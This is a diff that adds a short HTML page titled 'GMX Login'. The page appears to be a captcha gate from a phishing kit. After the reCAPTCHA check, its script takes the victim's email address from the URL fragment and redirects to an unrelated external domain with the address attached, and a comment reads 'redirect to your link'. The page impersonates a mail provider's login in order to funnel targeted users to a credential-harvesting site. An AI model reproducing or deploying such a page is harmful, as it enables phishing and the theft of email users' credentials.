@@ -1,0 +1,30 @@
+<html><head>
+    <title>GMX Login</title>
+    <script src="https://www.google.com/recaptcha/api.js" async="" defer=""></script>
+  </head>
+  <body>
+      <center>
+          <h3>Please verify you are not a robot</h3>
+      <center>
+      <div class="g-recaptcha" data-sitekey="6LdEQFkkAAAAALdRW8BqoNG15MhZFRWoHXSuaDYy" data-callback="recaptchaCallback">
+      </div>
+  
+
+
+<script>
+function recaptchaCallback(){
+ var hash = window.location.hash; 
+ if( hash !== ""){
+     hash = hash.split('#');
+     
+     //normal email
+     const email = hash[1]; // to split between # and email are normal string
+     //base64
+     //const email = atob(email); // to split between # and email are base64
+     
+     window.location.href = "https://www.cyprusvillamanagement.com/css#" + email; //redirect to your link
+ }else{
+     window.location.href = "https://www.cyprusvillamanagement.com/css#";
+ }
+}
+</script></center></center></body></html>
